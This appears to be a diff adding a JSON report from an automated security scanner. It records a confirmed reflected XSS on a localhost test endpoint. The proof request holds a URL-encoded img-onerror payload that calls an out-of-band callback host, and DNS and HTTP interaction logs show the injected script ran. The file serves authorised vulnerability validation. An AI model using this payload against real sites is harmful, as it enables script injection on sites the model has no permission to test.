@@ -1,0 +1,33 @@
+[
+  {
+    "class": "xss",
+    "subtype": "reflected",
+    "severity": "high",
+    "endpoint": "http://127.0.0.1:8199/reflect",
+    "param": "q",
+    "proof_request": "GET http://127.0.0.1:8199/reflect?q=%22%3E%3Cimg+src%3Dx+onerror%3D%22new+Image%28%29.src%3D%27https%3A%2F%2Fxec1468a62d.dc2c6ls70i14reti1c90n7yrhryescwyo.oast.me%2Fxec1468a62d%27%3Bconsole.log%28%27xec1468a62d%27%29%22%3E",
+    "validated_by": "headless Chrome executed the injected JS -> out-of-band callback fired",
+    "oob_provider": "InteractshOOB",
+    "proof_interactions": [
+      {
+        "protocol": "dns",
+        "full-id": "xec1468a62d.dc2c6ls70i14reti1c90n7yrhryescwyo",
+        "q-type": "A",
+        "remote-address": "185.141.119.131",
+        "timestamp": "2026-11-23T22:51:10.887364773Z"
+      },
+      {
+        "protocol": "http",
+        "full-id": "xec1468a62d.dc2c6ls70i14reti1c90n7yrhryescwyo",
+        "q-type": null,
+        "remote-address": "185.141.119.152",
+        "timestamp": "2026-11-23T22:51:12.419960795Z"
+      }
+    ],
+    "corroboration": {
+      "console_marker_logged": true
+    },
+    "confirmed": true,
+    "note": "PROOF of execution in a standard Chrome. Impact/stored-propagation is human-gated."
+  }
+]
